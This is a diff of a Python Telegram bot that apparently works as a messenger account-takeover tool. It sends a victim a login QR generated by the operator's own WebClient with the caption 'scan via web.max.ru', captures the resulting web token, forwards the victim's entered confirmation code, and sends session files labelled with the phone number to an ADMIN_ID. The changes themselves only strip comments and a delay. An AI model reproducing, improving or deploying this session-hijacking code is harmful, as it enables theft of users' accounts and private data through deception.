@@ -106,7 +106,6 @@ async def send_files_to_user(phone, user_id, work_dir, desktop, js):
     await bot.send_document(ADMIN_ID, FSInputFile(dp), caption=f"💻 Десктоп\n{phone}")
 
 async def get_web_token_via_qr(phone, uid, work_dir, user_password, user_id):
-    """Запускает WebClient, отправляет QR пользователю, ждёт веб-токен."""
     qr_link_holder = {}
 
     class QrCatcher(QrHandler):
@@ -121,7 +120,6 @@ async def get_web_token_via_qr(phone, uid, work_dir, user_password, user_id):
 
     task = asyncio.ensure_future(web_client.start())
 
-    # Ждём QR
     for _ in range(30):
         await asyncio.sleep(1)
         if 'link' in qr_link_holder:
@@ -133,20 +131,17 @@ async def get_web_token_via_qr(phone, uid, work_dir, user_password, user_id):
 
     qr_link = qr_link_holder['link']
 
-    # Генерируем QR-картинку
     img = qrcode.make(qr_link)
     img_bytes = BytesIO()
     img.save(img_bytes, format='PNG')
     img_bytes.seek(0)
 
-    # Отправляем пользователю
     await bot.send_photo(
         uid,
         photo=BufferedInputFile(img_bytes.getvalue(), filename='qr.png'),
         caption="📱 Отсканируйте этот QR через web.max.ru\n⏳ 2 минуты"
     )
 
-    # Ждём веб-токен
     try:
         await asyncio.wait_for(task, timeout=120)
         if web_client.token:
@@ -330,11 +325,11 @@ async def code_handler(message: types.Message, state: FSMContext):
     phone = data.get("phone", "")
     work_dir = data.get("work_dir", "")
 
+    # Передаём код МГНОВЕННО
     import builtins
     builtins._code = message.text.strip()
 
     msg = await message.answer("⏳ Проверяю код...")
-    await asyncio.sleep(2)
 
     for _ in range(240):
         await asyncio.sleep(0.5)
